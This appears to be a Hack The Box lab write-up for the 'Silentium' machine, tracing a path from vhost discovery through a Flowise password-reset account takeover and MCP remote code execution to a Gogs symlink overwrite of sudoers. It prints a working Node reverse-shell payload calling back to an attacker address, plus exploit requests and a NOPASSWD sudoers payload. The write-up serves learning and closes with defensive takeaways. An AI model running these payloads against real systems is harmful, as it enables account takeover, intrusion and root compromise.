Silentium

Hack The Box Machine Report

Machine Info

Difficulty: Medium

Operating System: Linux

Status: Active

Date Completed:16 June 2026

Summary

Silentium was a Linux machine that focused on web enumeration, virtual host discovery, vulnerable Flowise functionality, Docker/container enumeration, credential reuse, and exploiting an internal Gogs service to gain root access. The initial attack path began with discovering a staging virtual host running Flowise. The Flowise version was vulnerable to an account takeover issue and later remote code execution, which led to a shell inside a Docker container. Environment variables inside the container exposed credentials that allowed SSH access as the user ben. Internal service enumeration then revealed Gogs running on localhost, which was exploited through a symlink overwrite issue to modify sudoers and gain root.

Recon / Enumeration

nmap -sV -T4 10.129.16.77 -oN nmap-silentium.txt

The initial scan showed two externally exposed TCP ports:

Port Service Version Notes Vulnerabilities / Interest
22 SSH OpenSSH 9.6p1 Ubuntu SSH service available Used later after credential discovery
80 HTTP nginx 1.24.0 Ubuntu Main website for Silentium Led to web and vhost enumeration

The domain silentium.htb was added to /etc/hosts. After browsing the main site and checking headers, directory enumeration was performed. 

curl -I http://silentium.htb

gobuster dir -u http://silentium.htb \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
--exclude-length 8753

Directory enumeration discovered an /assets directory. Accessing /assets/ directly returned a 403 Forbidden response, confirming that the directory existed but directory listing was blocked.

Virtual Host Discovery

Since the main website did not immediately expose a clear attack path, virtual host fuzzing was performed. This revealed the staging.silentium.htb virtual host. 

gobuster vhost -u http://silentium.htb \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
--append-domain

The discovered virtual host was added to /etc/hosts: 

echo "10.129.16.77 silentium.htb staging.silentium.htb" | sudo tee -a /etc/hosts

Flowise Enumeration

Visiting staging.silentium.htb showed a Flowise login page. Flowise is a drag-and-drop platform for building AI workflows. Since the application exposed API endpoints, the version was checked through the API. 

curl -X GET http://staging.silentium.htb/api/v1/version

The application returned:

{"version":"3.0.5"}

Flowise version 3.0.5 was vulnerable to multiple issues, including an account takeover vulnerability involving the password reset flow and a remote code execution issue involving custom MCP configuration.

Initial Foothold - Account Takeover

The main Silentium website listed several employees, including Marcus, Ben, and Elena. Based on the naming pattern, the email ben@silentium.htb was tested against the Flowise forgot-password endpoint. 

curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
-H "Content-Type: application/json" \
-d '{"user":{"email":"ben@silentium.htb"}}'

The response included a temporary password reset token. This was a security issue because a reset token should not be returned directly in an API response.

The password was then reset using the returned tempToken. 

curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
-H "Content-Type: application/json" \
-d '{
  "user": {
    "email": "ben@silentium.htb",
    "tempToken": "TEMP_TOKEN_HERE",
    "password": "[REDACTED]"
  }
}'

After receiving a successful response, it was possible to log into Flowise as ben@silentium.htb using the new password.

Remote Code Execution

After logging into Flowise, an API key was generated from the application. The Flowise custom MCP endpoint was then used to execute a reverse shell payload.

First, a listener was started on the attacker machine:

nc -lvnp 4444

A JSON payload was created:

nano payload.json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.209 4444 >/tmp/f');return 1;})()} )"
  }
}

The payload was sent to the vulnerable Flowise endpoint:

curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
-H "Authorization: Bearer FLOWISE_API_KEY_HERE" \
-H "Content-Type: application/json" \
-d @payload.json

This returned a reverse shell. The shell initially landed inside a Docker container running the Flowise application.

Docker / Container Enumeration

The shell appeared to be inside a container because of the minimal environment, container-like hostname, and application-specific environment variables. The environment variables for process 1 were checked: 

cat /proc/1/environ | tr '\0' '\n'

Important values included:

FLOWISE_USERNAME=ben
SENDER_EMAIL=ben@silentium.htb
SMTP_USERNAME=test
SMTP_USER=test
SMTP_HOST=mailhog
SMTP_PASSWORD=[REDACTED]
DATABASE_PATH=/root/.flowise
SECRETKEY_PATH=/root/.flowise
PORT=3000

The password [REDACTED] was found in the container environment variables. This password was tested against the real host user ben over SSH. 

ssh ben@silentium.htb

The password worked, giving SSH access as ben on the host system. The user flag was located in Ben's home directory. 

ben@silentium:~$ ls
user.txt

Privilege Escalation Enumeration

After gaining SSH access as ben, local enumeration was performed. Active listening ports revealed several services bound to localhost only. 

ss -tulpn

Important internal ports included:

Port Binding Likely Service Notes
3000 127.0.0.1 Flowise / Node app Internal web application
3001 127.0.0.1 Gogs Internal self-hosted Git service
1025 127.0.0.1 MailHog SMTP Local mail testing service
8025 127.0.0.1 MailHog Web UI Internal web interface

The service on port 3001 was confirmed as Gogs because the HTTP response included the cookie i_like_gogs. 

curl -I http://127.0.0.1:3001

Accessing Internal Gogs

Since Gogs was only listening on localhost, SSH port forwarding was used to access it from the attacker machine. 

ssh -L 8001:127.0.0.1:3001 ben@silentium.htb

The Gogs web interface was then accessible from the attacker's browser: 

http://127.0.0.1:8001

A new Gogs account was registered, a repository was created, and a personal access token was generated from User Settings > Applications.

Root - Gogs Symlink Exploit

Gogs was vulnerable to a symlink file overwrite issue. The attack involved creating a repository containing a symbolic link to /etc/sudoers.d/ben, then using the Gogs API to update the symlink target with sudoers content.

The repository was cloned through the SSH tunnel:

git clone http://127.0.0.1:8001/test/test.git
cd test

A malicious symlink was created:

ln -s /etc/sudoers.d/ben malicious_symlink
git add malicious_symlink
git commit -m "Add malicious symlink"
git push

The payload gave Ben passwordless sudo access:

ben ALL=(ALL) NOPASSWD:ALL

The payload was base64 encoded and sent through the Gogs API:

GOGS_TOKEN="GOGS_TOKEN_HERE"
GOGS_USER="test"
GOGS_REPO="test"
PAYLOAD=$(echo -n "ben ALL=(ALL) NOPASSWD:ALL" | base64 -w 0)

curl -i -X PUT "http://127.0.0.1:8001/api/v1/repos/$GOGS_USER/$GOGS_REPO/contents/malicious_symlink" \
-H "Authorization: token $GOGS_TOKEN" \
-H "Content-Type: application/json" \
-d "{
  \"message\": \"update via symlink\",
  \"content\": \"$PAYLOAD\"
}"

After the API request succeeded, the sudoers file was modified. Returning to the SSH session as ben, root access was obtained with: 

sudo su

The shell changed to root:

root@silentium:/home/ben# id
uid=0(root) gid=0(root) groups=0(root)

Vulnerabilities / Misconfiguration

The first major issue was a vulnerable Flowise password reset workflow. The application returned a temporary reset token in the API response, allowing an attacker to reset another user's password and take over the account.

The second issue was Flowise remote code execution through the custom MCP functionality. After obtaining access to the Flowise account and API key, the vulnerable endpoint allowed command execution on the underlying Flowise container.

The third issue was credential exposure through Docker environment variables. Sensitive values, including an SMTP password, were stored in the container environment. That password was reused for the host user ben, allowing SSH access.

The final privilege escalation path involved an internal Gogs service vulnerable to a symlink overwrite issue. By using the Gogs API against a repository containing a symlink to /etc/sudoers.d/ben, it was possible to write sudoers content and give Ben passwordless sudo access.

Defensive Takeaways

Password reset tokens should never be returned directly in API responses. Reset links or tokens should only be delivered through a trusted channel, such as the registered email address, and should be short-lived, single-use, and tied to the requesting account.

Applications like Flowise should be kept updated, especially when public advisories are released for authentication bypass, account takeover, or remote code execution issues. Exposed API endpoints should also be reviewed and restricted where possible.

Secrets should not be stored directly in container environment variables when avoidable, and credentials should never be reused between containers, services, and host user accounts. Internal services such as Gogs should be patched, monitored, and protected from unsafe file handling behavior such as symlink overwrites.

Lessons Learned

This machine reinforced the importance of thorough web enumeration and virtual host fuzzing. The main website did not immediately expose the attack path, but discovering staging.silentium.htb revealed the vulnerable Flowise application.

I also learned how valuable container enumeration can be after gaining a shell. Even when the initial shell is inside Docker, environment variables can expose credentials, service relationships, and application secrets that help pivot to the host.

Finally, this box showed why checking localhost services after SSH access is important. Gogs was not visible from the outside during the initial Nmap scan because it was bound to 127.0.0.1. Using SSH tunneling made it possible to access and exploit the internal service.
